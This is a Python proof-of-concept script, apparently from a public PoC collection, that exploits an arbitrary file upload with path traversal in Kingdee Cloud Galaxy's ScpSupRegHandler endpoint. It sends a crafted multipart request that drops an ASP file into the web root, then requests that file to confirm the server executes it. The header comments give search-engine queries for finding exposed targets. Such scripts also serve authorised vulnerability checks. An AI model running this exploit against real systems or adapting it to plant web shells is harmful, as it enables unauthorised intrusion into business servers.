#!/usr/bin/python3
# -*- coding:utf-8 -*-
# author:MDSEC
# from:https://github.com/MD-SEC/MDPOCS
# fofa：icon_hash="-1629133697"
# zoomeye:app:"金蝶云星空


import sys
import requests
import csv
import urllib3
import hashlib
from concurrent.futures import ThreadPoolExecutor
urllib3.disable_warnings()

def verify(site):
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/111.0",
        "Content-Type": "multipart/form-data;boundary=fd18dd968b553715cbc5a1982526199b"
    }
    data ="""--fd18dd968b553715cbc5a1982526199b
Content-Disposition: form-data; name="FAtt"; filename="../../../../uploadfiles/vulntest.asp."
Content-Type: text/plain

<% Response.Write("vulntest") %>
--fd18dd968b553715cbc5a1982526199b
Content-Disposition: form-data; name="FID"

2022
--fd18dd968b553715cbc5a1982526199b
Content-Disposition: form-data; name="dbId_v"

.
--fd18dd968b553715cbc5a1982526199b--
"""
    vulurl = site + "/k3cloud/SRM/ScpSupRegHandler"
    vulurl1 = site + "/K3Cloud/uploadfiles/vulntest.asp"
    
    try:
        r = requests.post(vulurl, headers=headers,data=data,verify=False)
        #print(r.text)
        if  "true" in r.text:
            r2=requests.get(vulurl1,headers=headers,verify=False)
            if r2.status_code==200 and "vulntest" in r2.text:
                return site + "/K3Cloud/uploadfiles/vulntest.asp"
            else:
                return ""
        else:
            return ""
    except:
        return ""

if __name__=="__main__":
    target = sys.argv[1]
    info = verify(target)
    if info != "":
        print("[+]漏洞存在，文件上传后的路径为：", info)
    else:
        print("[-]漏洞不存在")
